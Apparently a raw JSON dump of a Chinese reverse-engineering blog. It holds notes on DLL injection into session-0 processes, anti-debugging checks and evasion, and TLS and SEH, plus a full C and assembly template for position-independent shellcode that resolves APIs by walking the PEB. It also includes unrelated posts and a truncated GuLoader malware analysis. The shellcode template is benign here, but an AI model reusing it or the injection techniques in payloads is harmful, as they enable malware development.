包含IMAGE_CHARACTERISTICS_DYNAMIC_BASE(0040)标志 （删除这个即不支持ASLR，调试时可用） 10、Session机制Session 机制即每一个登陆的用户都有个一个不同的session，windows7以后第一个登陆的用户session ID为1，系统会话为0，这种机制被称为会话0隔离机制。系统进程和服务进程运行在Session 中，这使得一般的DLL注入CreateRemoteThread 失败，原始是win7以后该函数的底层逻辑发生了变化，调用ZwCreateTheadEx时，参数CreateSuspended 参数为1，若远程进程属于session 0 则不会恢复运行，返回错误, 如果改成0即可调用成功。因为针对session0 的进程进行注入需要直接调用ZwCreateThreadEx函数，传入参数CreateSuspended 为0即可。 11、TLS回调所谓TLS回调函数是指每当创建&#x2F;终止进程的线程时会自动调用执行的函数，创建进程的主线程时也会自动调用回调函数，并且其调用执行先于EP代码，经常被用于反调试。 Reason 一共有四个选项DLL_PROCESS_ATTACH、DLL_THREAD_ATTACH、DLL_THREAD_DETACH和DLL_PROCESS_DETACH 示例程序如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;//告诉链接器在PE文件中要创建TLS目录#pragma comment(linker,&quot;/INCLUDE:__tls_used&quot;)void print_console(char*szMsg)&#123; HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE); WriteConsoleA(hStdout, szMsg, strlen(szMsg), NULL, NULL);&#125;void NTAPI TLS_CALLBACK1(PVOID DLLHandle, DWORD Reason, PVOID Reserved)&#123; char szMsg[80] = &#123; 0, &#125;; wsprintfA(szMsg, &quot;TLS_CALLBACK1()DLLHandle =%X,Reason %d\\n&quot;, DLLHandle, Reason); print_console(szMsg);&#125;void NTAPI TLS_CALLBACK2(PVOID DLLHandle, DWORD Reason, PVOID Reserved)&#123; char szMsg[80]&#123;0, &#125;; wsprintfA(szMsg, &quot;TLS_CALLBACK2():DlLHandle =%X,Reason %d\\n&quot;, DLLHandle, Reason); print_console(szMsg);&#125;//创建一个tls section X represent random mark L represents Tls callback section X can be B-Y#pragma data_seg(&quot;.CRT$XLX&quot;)// 定义多个回调函数PIMAGE_TLS_CALLBACK PTLS_CALLBACKs[]&#123;TLS_CALLBACK1, TLS_CALLBACK2,0&#125;;#pragma data_seg()DWORD WINAPI ThreadProc(LPVOID LParam)&#123; print_console(&quot;ThreadProc()start\\n&quot;); print_console(&quot;ThreadProc()end\\n&quot;); return 0;&#125;int main(void)&#123; HANDLE hThread=NULL; print_console(&quot;main()start\\n&quot;); hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); WaitForSingleObject(hThread, 60 * 1000); CloseHandle(hThread); print_console(&quot;main()end\\n&quot;); return 0;&#125; 12、TEB访问方法： Ntdll.NtCurrentTeb() FS:[0x18] FS:[0] &#x3D;SEH 起始地址 13、PEB 访问方法 123456方法1 FS:[0x30]FS:[0x30] = PEB 起始地址mov eax, DWORD PTR FS:[0x30]方法2 FS:[0x18] 找到TEB，再根据TEB的偏移找PEBmov eax,DWORD PRT FS:[0x18]mov eax,DWPRD PTR DS:[EAX+0x30] PEB的几个重点结构 BeingDebugged 0x2 IsDebuggerPresent ImageBaseAddress 0x8 Ldr 0xc 指向 _PEB_LDR_DATA ，偏移0x0c，0x14，0x1c 的位置有三个_LIST_ENTRY结构，双向链表保存着加载到进程的DLL模块对应的__LDR_DATA_ENTRY的地址，解析这个结构可以获取该DLL的加载信息。 ProcessHeap 0x18 GetProcessHeap() ， 第三个flags成员和第四个ForceFlags成员被用作反调试正常情况下flags的值为2 ForceFlags的值为0 NtGlobalFlag 0x68 调试被设置为0x70 13、SEH链链表的形式存在，链表的结构 12345typedef struct _EXCEPTION_REGISTRATION_RECORD&#123; PEXCEPTION_REGISTRATION_RECORD Next; PEXCEPTION_DISPOSITION Handler;&#125; EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD; next 成员是指向下一个_EXCEPTION_REGISTRATION_RECORD结构体的指针，handler是异常处理函数，next如果值为0xFFFFFFFF，代表是SEH链的最后一个节点。 异常处理函数 EXCEPTION_DISPOSITION的定义如下： 12345678910111213141516171819202122232425EXCEPTION_DISPOSITION _except_handler(EXCEPTION_RECORD *pRecord,EXCEPTION_REGISTRATION_RECORD *pFrame,CONTEXT *pContext,PVOID pValue)//以上返回名为EXCEPTION_DISPOSITION的枚举类型typedef enum _EXCEPTION_DISPOSITION&#123; ExceptionContinueExecution = 0,//继续执行异常代码 ExceptionContinueSearch = 1, //运行下一个异常处理器 ExceptionNestedException = 2, // OS 内部使用 ExceptionCollidedUnwind = 3 //OS 内部使用&#125; EXCEPTION_DISPOSITION; typedef struct _EXCEPTION_RECORD &#123; DWORD ExceptionCode; DWORD ExceptionFlags; struct _EXCEPTION_RECORD *ExceptionRecord; PVOID ExceptionAddress; DWORD NumberParameters; ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];&#125; EXCEPTION_RECORD; SEH的安装 123push handler push DWORD PTR FS:[0]mov DWORD PTR FS:[0],esp SEH的删除 12pop DWORD PTR FS:[0]add esp,4 注意 OD 调试异常时，可通过shift+F9&#x2F;F8&#x2F;F7 使得异常抛给程序异常处理函数而不是调试器。 14、反调试技术 静态反调试技术 PEB BeingDebugged (0x2) 值为 1 PEB Ldr(0xC) 未使用的堆内存填充为0XFEEEFEEE PEB ProcessHeap (0x18) 结构体中 Flag(0xC) 不等于2 Force Flags(0x10) 不等于0 PEB NtGlobalFlag(0x68) 值为0x70 NtQueryInformationProcess 函数的特定参数， 第二个参数ProcessInformationClass 指定为ProcessDebugPort(0x7) 返回的第三个参数dwDebugPort 等于0xFFFFFFFF，CheckRemoteDebuggerPresent 内部调用了NtQueryInformationProcess（ProcessDebugPort(0x7) ） 第二个参数ProcessInformationClass 指定为ProcessDebugObjectHandle(0x1E) 返回的第三个参数DebugObject 等于非NULL 第二个参数ProcessInformationClass 指定为ProcessDebugFlags(0x1F) 返回的第三个参数为0 NtQuerySystemInformation函数 检测当前系统是否处于调试状态 SystemInformationClass 传入SystemKernelDebuggerInformation(0x23), 第三个参数返回SYSTEM_KERNEL_DEBUGGER_INFORMATION 结构体地址，其中DebuggerEnabled 值被设置为1 NtQueryObject 检查调试对象的存在 第二个参数ObjectAllTypesInformation(3),遍历返回的链表对应的结构体（POBJECT_TYPE_INFORMATION）-&gt;TypeName.Buffer，对比”DebugObject” ZwSetInformation 第二个参数ThreadInformationClass 设置为ThreadHideFromDebugger(0x11),调试器会终止，自身也会终止 TLS回调 ETC 检测调试工具进程，窗口 检测计算机名称 检测程序运行路径 检测虚拟机 动态反调试技术 SEH异常 time check RDTSC NtQueryPerformanceCounter GetTickCount EFlags 的TF（Trap Flag）TF&#x3D;1,CPU 进入单步中断模式 1234//修改方法PUSHFDOR DWORD PTR SS:[ESP],100POPFD int2D 调试状态下不会运行SEH，而是跳过一个字节仅需运行。 0xCC 探测 比较代码区域的校验和 API 重定向技术 Debug Blocker(Self Debugging) 15、服务进程的调试服务的原理 服务程序由SCM管理，运行服务程序时，服务控制器向SCM提出控制请求，SCM向服务程序传递控制命令，并接收返回值。 服务启动的过程 服务控制器调用StartService() 服务控制器调用StartService, SCM 创建服务进程，然后执行服务进程的EP代码。 服务进程调用StartServiceCtrlDispatcher() 服务进程内部调用StartServiceCtrlDispatcher 注册服务主函数SvcMain的地址，随后返回StartService函数。接着SCM调用服务进程的SvcMain函数。 服务进程调用SetServiceStatus() 服务进程运行SvcMain函数时，调用SetServiceStatus 使得服务状态从SERVICE_START_PENDING 变成SERVICE_RUNNING。 服务调试方法 直接调试，找到SvcMain函数，跳转到该位置，然后修改EIP，OD需要勾选Memory access violation。 附加方式 安装服务 修改服务启动超时时间 HKLM\\SYSTEM\\CurrentControlSet\\Control ServicesPipeTimeout 设置完成重启系统 修改服务程序，设置无限循环 修改OEP代码前两个字节为EB FE（跳到自身） 也有一些通过设置映像劫持的方式在服务启动的时候挂载到调试器，此时需要设置服务允许桌面交互 启动服务 附加到调试器，跳转到EP，恢复EP 16、自我创建的进程调试父进程一个挂起方式创建子进程，然后修改子进程的context的eip，最后恢复运行。 调试方法1：查找子进程的context 的eip位置，对应地址的内容修改为EB FE，从而无限循环。 调试方案2： 设置OD为实时调试，然后修改context 的eip位置的内容为0xCC，触发异常，OD接管程序。 17、PE映像切换调试A 启动B（挂起) -&gt; unmap B -&gt; map C-&gt;exec c 调试方法： 把C的入口点代码 修改为无限循环（EB FE）。 18、Debug Blocker 程序调试 父进程作为调试器，子进程作为被调试程序，被调试进程的所有异常均由调试器处理，子进程故意触发异常，父进程接收异常，控制权转移，父进程进行修改代码，修改执行分支等。 首先利用条件断点理清楚逻辑，父进程WaitForDebugEvent的位置，跳转的位置，子进程故意触发异常的位置，恢复运行的位置。 随后开始OD附加到父进程一直执行到解密子进程代码完成后，设置子进程eip的位置内容为无限循环（EB FE），借助于process hacker修改内存也可以，父进程执行一段代码调用DebugActiveProcessStop 分离父子进程，OD再附加到子进程进行调试。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"通用shellcode编写","slug":"编程/shellcode编写","date":"2022-11-30T16:00:00.000Z","updated":"2024-03-12T15:48:46.130Z","comments":true,"path":"2022/12/01/编程/shellcode编写/","link":"","permalink":"http://zwjsfdbb.top/2022/12/01/%E7%BC%96%E7%A8%8B/shellcode%E7%BC%96%E5%86%99/","excerpt":"1、过程如下 寻找函数地址，通过FS（GS）寻找TEB，通过TEB找PEB，通过PEB找PEB_LDR_DATA,通过PEB——LDR_DATA找InInitializationOrderMoudleList 进而寻找到kernel32对应的链表节点，特定偏移即为基地址，解析PE导出表，寻找需要的函数地址。 提取shellcode 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#pragma code_seg(&quot;shellcode&quot;)#include &lt;windows.h&gt;#pragma comment(linker,&quot;/entry:main&quot;) void main()&#123; //the pointer of kernel32.dll base address DWORD dwKernel32Addr = 0; _asm &#123; push eax mov eax, dword ptr fs:[0x30] mov eax, [eax + 0x0C] mov eax,[eax + 0x1C] mov eax, [eax] mov eax, [eax + 0x08] mov dwKernel32Addr, eax pop eax &#125; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dwKernel32Addr; PIMAGE_NT_HEADERS32 pNtHeader = (PIMAGE_NT_HEADERS32)(dwKernel32Addr + pDosHeader-&gt;e_lfanew); PIMAGE_DATA_DIRECTORY pDataDirectory = pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT; PIMAGE_EXPORT_DIRECTORY pExportFuncTable = (PIMAGE_EXPORT_DIRECTORY)(dwKernel32Addr + pDataDirectory-&gt;VirtualAddress); PDWORD pAddrOfFunc = (PDWORD)(pExportFuncTable-&gt;AddressOfFunctions + dwKernel32Addr); PDWORD pAddrOfFuncNames = (PDWORD)(pExportFuncTable-&gt;AddressOfNames + dwKernel32Addr); PWORD pAddrOfOrdinals = (PWORD)(pExportFuncTable-&gt;AddressOfNameOrdinals + dwKernel32Addr); DWORD dwFuncGetProcAddress = 0; for (size_t i = 0; i &lt; pExportFuncTable-&gt;NumberOfNames; i++) &#123; PCHAR lpFuncName = (PCHAR)(pAddrOfFuncNames[i] + dwKernel32Addr); DWORD digest = 0; while (*lpFuncName) &#123; digest = ((digest &lt;&lt; 25) | (digest &gt;&gt; 7)); digest += *lpFuncName; lpFuncName++; &#125; if (digest == 0xbbafdf85)//0xbbafdf85是经过自定义hash算法得到GetProcAddress函数的摘要 &#123; dwFuncGetProcAddress = pAddrOfFunc[pAddrOfOrdinals[i]] + dwKernel32Addr; break; &#125; &#125; /* 如果是弹窗弹窗，这里我们需要 : LoadLibraryExA、MessageBoxA、ExitProcess、user32.dll */ /* 定义函数指针GetProcAddress */ typedef FARPROC (WINAPI *funcGetProcAddress)( HMODULE hModule, LPCSTR lpProcName ); funcGetProcAddress pfuncGetProcAddress = (funcGetProcAddress)dwFuncGetProcAddress; /* LoadLibraryExA 函数指针获取 */ typedef HMODULE (WINAPI *funcLoadLibraryExA)( LPCSTR lpLibFileName, HANDLE hFile, DWORD dwFlags ); //如果采用字符串模式，其字符串会被放入数据段，使用的每次加载地址都不一样, char szLoadLibraryExA[] = &#123; &#x27;L&#x27;,&#x27;o&#x27;,&#x27;a&#x27;,&#x27;d&#x27;,&#x27;L&#x27;,&#x27;i&#x27;,&#x27;b&#x27;,&#x27;r&#x27;,&#x27;a&#x27;,&#x27;r&#x27;,&#x27;y&#x27;,&#x27;E&#x27;,&#x27;x&#x27;,&#x27;A&#x27;,&#x27;\\0&#x27; &#125;; char szUser32[] = &#123; &#x27;u&#x27;,&#x27;s&#x27;,&#x27;e&#x27;,&#x27;r&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;.&#x27;,&#x27;d&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;\\0&#x27; &#125;; char szMessageBoxA[] = &#123; &#x27;M&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;a&#x27;,&#x27;g&#x27;,&#x27;e&#x27;,&#x27;B&#x27;,&#x27;o&#x27;,&#x27;x&#x27;,&#x27;A&#x27;,&#x27;\\0&#x27; &#125;; char szExitProcess[] = &#123; &#x27;E&#x27;,&#x27;x&#x27;,&#x27;i&#x27;,&#x27;t&#x27;,&#x27;P&#x27;,&#x27;r&#x27;,&#x27;o&#x27;,&#x27;c&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;\\0&#x27; &#125;; funcLoadLibraryExA pfuncLoadLibraryExA = (funcLoadLibraryExA)(pfuncGetProcAddress((HMODULE)dwKernel32Addr,szLoadLibraryExA)); /* ExitProcess函数指针 */ typedef VOID (WINAPI *funcExitProcess)( _In_ UINT uExitCode ); funcExitProcess pfuncExitProcess = (funcExitProcess)(pfuncGetProcAddress((HMODULE)dwKernel32Addr, szExitProcess)); /* * 加载user32.dll 和messagebox */ typedef int (WINAPI *funcMessageBoxA)( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType); funcMessageBoxA pfuncMessageBoxA = (funcMessageBoxA)(pfuncGetProcAddress((HMODULE)(pfuncLoadLibraryExA(szUser32, NULL, NULL)), szMessageBoxA)); char szContext[] = &#123;&#x27;t&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;s&#x27;,&#x27; &#x27;,&#x27;i&#x27;,&#x27;s&#x27;,&#x27; &#x27;,&#x27;a&#x27;,&#x27; &#x27;,&#x27;t&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;\\0&#x27; &#125;; char szTitle[] = &#123; &#x27;t&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;\\0&#x27; &#125;; pfuncMessageBoxA(NULL, szContext, szTitle, MB_OK); pfuncExitProcess(0);&#125; 将程序拖入OD，按F9进入程序模块，如图所示： 然后从第一行开始，下拉到空白区选中 右键 复制 二进制复制。然后再在010editor中粘贴自 从十六进制文本粘贴。 如下图： 选中然后复制为c代码： 这样就得到了我们的shellcode","text":"1、过程如下 寻找函数地址，通过FS（GS）寻找TEB，通过TEB找PEB，通过PEB找PEB_LDR_DATA,通过PEB——LDR_DATA找InInitializationOrderMoudleList 进而寻找到kernel32对应的链表节点，特定偏移即为基地址，解析PE导出表，寻找需要的函数地址。 提取shellcode 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#pragma code_seg(&quot;shellcode&quot;)#include &lt;windows.h&gt;#pragma comment(linker,&quot;/entry:main&quot;) void main()&#123; //the pointer of kernel32.dll base address DWORD dwKernel32Addr = 0; _asm &#123; push eax mov eax, dword ptr fs:[0x30] mov eax, [eax + 0x0C] mov eax,[eax + 0x1C] mov eax, [eax] mov eax, [eax + 0x08] mov dwKernel32Addr, eax pop eax &#125; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dwKernel32Addr; PIMAGE_NT_HEADERS32 pNtHeader = (PIMAGE_NT_HEADERS32)(dwKernel32Addr + pDosHeader-&gt;e_lfanew); PIMAGE_DATA_DIRECTORY pDataDirectory = pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT; PIMAGE_EXPORT_DIRECTORY pExportFuncTable = (PIMAGE_EXPORT_DIRECTORY)(dwKernel32Addr + pDataDirectory-&gt;VirtualAddress); PDWORD pAddrOfFunc = (PDWORD)(pExportFuncTable-&gt;AddressOfFunctions + dwKernel32Addr); PDWORD pAddrOfFuncNames = (PDWORD)(pExportFuncTable-&gt;AddressOfNames + dwKernel32Addr); PWORD pAddrOfOrdinals = (PWORD)(pExportFuncTable-&gt;AddressOfNameOrdinals + dwKernel32Addr); DWORD dwFuncGetProcAddress = 0; for (size_t i = 0; i &lt; pExportFuncTable-&gt;NumberOfNames; i++) &#123; PCHAR lpFuncName = (PCHAR)(pAddrOfFuncNames[i] + dwKernel32Addr); DWORD digest = 0; while (*lpFuncName) &#123; digest = ((digest &lt;&lt; 25) | (digest &gt;&gt; 7)); digest += *lpFuncName; lpFuncName++; &#125; if (digest == 0xbbafdf85)//0xbbafdf85是经过自定义hash算法得到GetProcAddress函数的摘要 &#123; dwFuncGetProcAddress = pAddrOfFunc[pAddrOfOrdinals[i]] + dwKernel32Addr; break; &#125; &#125; /* 如果是弹窗弹窗，这里我们需要 : LoadLibraryExA、MessageBoxA、ExitProcess、user32.dll */ /* 定义函数指针GetProcAddress */ typedef FARPROC (WINAPI *funcGetProcAddress)( HMODULE hModule, LPCSTR lpProcName ); funcGetProcAddress pfuncGetProcAddress = (funcGetProcAddress)dwFuncGetProcAddress; /* LoadLibraryExA 函数指针获取 */ typedef HMODULE (WINAPI *funcLoadLibraryExA)( LPCSTR lpLibFileName, HANDLE hFile, DWORD dwFlags ); //如果采用字符串模式，其字符串会被放入数据段，使用的每次加载地址都不一样, char szLoadLibraryExA[] = &#123; &#x27;L&#x27;,&#x27;o&#x27;,&#x27;a&#x27;,&#x27;d&#x27;,&#x27;L&#x27;,&#x27;i&#x27;,&#x27;b&#x27;,&#x27;r&#x27;,&#x27;a&#x27;,&#x27;r&#x27;,&#x27;y&#x27;,&#x27;E&#x27;,&#x27;x&#x27;,&#x27;A&#x27;,&#x27;\\0&#x27; &#125;; char szUser32[] = &#123; &#x27;u&#x27;,&#x27;s&#x27;,&#x27;e&#x27;,&#x27;r&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;.&#x27;,&#x27;d&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;\\0&#x27; &#125;; char szMessageBoxA[] = &#123; &#x27;M&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;a&#x27;,&#x27;g&#x27;,&#x27;e&#x27;,&#x27;B&#x27;,&#x27;o&#x27;,&#x27;x&#x27;,&#x27;A&#x27;,&#x27;\\0&#x27; &#125;; char szExitProcess[] = &#123; &#x27;E&#x27;,&#x27;x&#x27;,&#x27;i&#x27;,&#x27;t&#x27;,&#x27;P&#x27;,&#x27;r&#x27;,&#x27;o&#x27;,&#x27;c&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;\\0&#x27; &#125;; funcLoadLibraryExA pfuncLoadLibraryExA = (funcLoadLibraryExA)(pfuncGetProcAddress((HMODULE)dwKernel32Addr,szLoadLibraryExA)); /* ExitProcess函数指针 */ typedef VOID (WINAPI *funcExitProcess)( _In_ UINT uExitCode ); funcExitProcess pfuncExitProcess = (funcExitProcess)(pfuncGetProcAddress((HMODULE)dwKernel32Addr, szExitProcess)); /* * 加载user32.dll 和messagebox */ typedef int (WINAPI *funcMessageBoxA)( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType); funcMessageBoxA pfuncMessageBoxA = (funcMessageBoxA)(pfuncGetProcAddress((HMODULE)(pfuncLoadLibraryExA(szUser32, NULL, NULL)), szMessageBoxA)); char szContext[] = &#123;&#x27;t&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;s&#x27;,&#x27; &#x27;,&#x27;i&#x27;,&#x27;s&#x27;,&#x27; &#x27;,&#x27;a&#x27;,&#x27; &#x27;,&#x27;t&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;\\0&#x27; &#125;; char szTitle[] = &#123; &#x27;t&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;\\0&#x27; &#125;; pfuncMessageBoxA(NULL, szContext, szTitle, MB_OK); pfuncExitProcess(0);&#125; 将程序拖入OD，按F9进入程序模块，如图所示： 然后从第一行开始，下拉到空白区选中 右键 复制 二进制复制。然后再在010editor中粘贴自 从十六进制文本粘贴。 如下图： 选中然后复制为c代码： 这样就得到了我们的shellcode","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"Try catch 反调试异常调试","slug":"逆向/Try catch 反调试异常调试","date":"2022-08-28T16:00:00.000Z","updated":"2024-03-12T15:25:42.534Z","comments":true,"path":"2022/08/29/逆向/Try catch 反调试异常调试/","link":"","permalink":"http://zwjsfdbb.top/2022/08/29/%E9%80%86%E5%90%91/Try%20catch%20%E5%8F%8D%E8%B0%83%E8%AF%95%E5%BC%82%E5%B8%B8%E8%B0%83%E8%AF%95/","excerpt":"1、IDA 反汇编的结果如下! 设置OD 取消所有异常勾选 调试时寻找位置，eax即为返回的位置","text":"1、IDA 反汇编的结果如下! 设置OD 取消所有异常勾选 调试时寻找位置，eax即为返回的位置","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"ubuntu 20.04 安装 opensdk 11","slug":"系统基础/ubuntu 20.04 安装 opensdk 11","date":"2022-08-06T16:00:00.000Z","updated":"2024-03-12T15:34:49.235Z","comments":true,"path":"2022/08/07/系统基础/ubuntu 20.04 安装 opensdk 11/","link":"","permalink":"http://zwjsfdbb.top/2022/08/07/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/ubuntu%2020.04%20%E5%AE%89%E8%A3%85%20opensdk%2011/","excerpt":"踩坑过程sudo apt-get updatesudo apt-get install openjdk-11-jdk都是扯淡，还有说是因为没有添加jdk 仓库sudo apt add-apt-repository ppa:openjdk-r&#x2F;ppa添加了还是不得行，最后还是自己下jdk 才得行wget https://download.java.net/java/GA/jdk11/9/GPL/openjdk-11.0.2_linux-x64_bin.tar.gz 下载完成后执行了以下命令sudo mkdir &#x2F;usr&#x2F;local&#x2F;jdksudo chown ubuntu:ubuntu &#x2F;usr&#x2F;local&#x2F;jdktar xzvf openjdk-11.0.2_linux-x64_bin.tar.gzcp -r openjdk-11.0.2 &#x2F;usr&#x2F;local&#x2F;jdk&#x2F; 接下来配置环境变量 sudo vim &#x2F;etc&#x2F;profile添加export JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;jdk&#x2F;jdk-11.0.2export PATH&#x3D; ${JAVA_HOME}&#x2F;bin:$PATH 请务必记住，不要在&#x3D;后面加空格，不然会造成无法登陆，运行source &#x2F;etc&#x2F;profile 会提示-bash: export: &#96;xxxx’: not a valid identifier 最后wq保存后运行 souce &#x2F;etc&#x2F;profile 即可。注销后重新登陆，运行java javac java –version 无异常就是安装成功了。","text":"踩坑过程sudo apt-get updatesudo apt-get install openjdk-11-jdk都是扯淡，还有说是因为没有添加jdk 仓库sudo apt add-apt-repository ppa:openjdk-r&#x2F;ppa添加了还是不得行，最后还是自己下jdk 才得行wget https://download.java.net/java/GA/jdk11/9/GPL/openjdk-11.0.2_linux-x64_bin.tar.gz 下载完成后执行了以下命令sudo mkdir &#x2F;usr&#x2F;local&#x2F;jdksudo chown ubuntu:ubuntu &#x2F;usr&#x2F;local&#x2F;jdktar xzvf openjdk-11.0.2_linux-x64_bin.tar.gzcp -r openjdk-11.0.2 &#x2F;usr&#x2F;local&#x2F;jdk&#x2F; 接下来配置环境变量 sudo vim &#x2F;etc&#x2F;profile添加export JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;jdk&#x2F;jdk-11.0.2export PATH&#x3D; ${JAVA_HOME}&#x2F;bin:$PATH 请务必记住，不要在&#x3D;后面加空格，不然会造成无法登陆，运行source &#x2F;etc&#x2F;profile 会提示-bash: export: &#96;xxxx’: not a valid identifier 最后wq保存后运行 souce &#x2F;etc&#x2F;profile 即可。注销后重新登陆，运行java javac java –version 无异常就是安装成功了。","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"python使用request库请求报超过url最大连接数","slug":"编程/python使用request库请求报超过url最大连接数错误解决办法","date":"2022-07-06T16:00:00.000Z","updated":"2024-03-12T14:36:28.401Z","comments":true,"path":"2022/07/07/编程/python使用request库请求报超过url最大连接数错误解决办法/","link":"","permalink":"http://zwjsfdbb.top/2022/07/07/%E7%BC%96%E7%A8%8B/python%E4%BD%BF%E7%94%A8request%E5%BA%93%E8%AF%B7%E6%B1%82%E6%8A%A5%E8%B6%85%E8%BF%87url%E6%9C%80%E5%A4%A7%E8%BF%9E%E6%8E%A5%E6%95%B0%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/","excerpt":"1、问题描述requests库使用过python的都不陌生，但有时候使用爬虫时会发送大量的请求，使用requests请求主机有连接限制，超过的时候就会报Max retries exceeded with url错误。 2、解决方案把每个请求包的返回包给关闭掉。 12345678910import requestsfrom requests.adapters import HTTPAdapter# 设置重连次数为 3 次requests.adapters.DEFAULT_RETRIES = 3s = requests.session()s.keep_alive = Falseresp = s.get(url=url, headers=Header)#关闭响应包resp.close()","text":"1、问题描述requests库使用过python的都不陌生，但有时候使用爬虫时会发送大量的请求，使用requests请求主机有连接限制，超过的时候就会报Max retries exceeded with url错误。 2、解决方案把每个请求包的返回包给关闭掉。 12345678910import requestsfrom requests.adapters import HTTPAdapter# 设置重连次数为 3 次requests.adapters.DEFAULT_RETRIES = 3s = requests.session()s.keep_alive = Falseresp = s.get(url=url, headers=Header)#关闭响应包resp.close()","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"记一次OD脱壳  -无法读取被调试进程的内存的问题","slug":"逆向/OD脱壳-无法读取被调试的内存","date":"2022-04-06T16:00:00.000Z","updated":"2024-03-12T14:54:24.499Z","comments":true,"path":"2022/04/07/逆向/OD脱壳-无法读取被调试的内存/","link":"","permalink":"http://zwjsfdbb.top/2022/04/07/%E9%80%86%E5%90%91/OD%E8%84%B1%E5%A3%B3-%E6%97%A0%E6%B3%95%E8%AF%BB%E5%8F%96%E8%A2%AB%E8%B0%83%E8%AF%95%E7%9A%84%E5%86%85%E5%AD%98/","excerpt":"问题描述如图所示，OD在调试dump内存时，出现无法读取内存的情况，一般是脱壳dump的内存超过了分配的内存。 解决办法： 注意看两个大小不一致，所以出现读取失败，修改Ollydump 的大小为00041000即可成功脱壳dump 下来。","text":"问题描述如图所示，OD在调试dump内存时，出现无法读取内存的情况，一般是脱壳dump的内存超过了分配的内存。 解决办法： 注意看两个大小不一致，所以出现读取失败，修改Ollydump 的大小为00041000即可成功脱壳dump 下来。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"GuLoader_VBS 分析","slug":"逆向/GuLoader_VBS分析","date":"2022-03-08T16:00:00.000Z","updated":"2024-03-12T15:10:02.919Z","comments":true,"path":"2022/03/09/逆向/GuLoader_VBS分析/","link":"","permalink":"http://zwjsfdbb.top/2022/03/09/%E9%80%86%E5%90%91/GuLoader_VBS%E5%88%86%E6%9E%90/","excerpt":"1、样本基本信息MD5: 6964c15109dfd8a657fc61c2589545a1 2、分析过程VBS 代码比较可读 主要功能在于将一段shellcode 二进制写入注册表项 HKEY_CURRENT_USER\\Software\\DORI\\FORTOLKNIN ，执行一段base64加密后的powershell 代码。 代码是base64加密的，利用vs 调试获取，如下 经过在线base64解密后， 发现有点乱","text":"1、样本基本信息MD5: 6964c15109dfd8a657fc61c2589545a1 2、分析过程VBS 代码比较可读 主要功能在于将一段shellcode 二进制写入注册表项 HKEY_CURRENT_USER\\Software\\DORI\\FORTOLKNIN ，执行一段base64加密后的powershell 代码。 代码是base64加密的，利用vs 调试获取，如下 经过在线base64解密后， 发现有点乱 在010editor 中转换成16进制模式，发现多了0x3F , 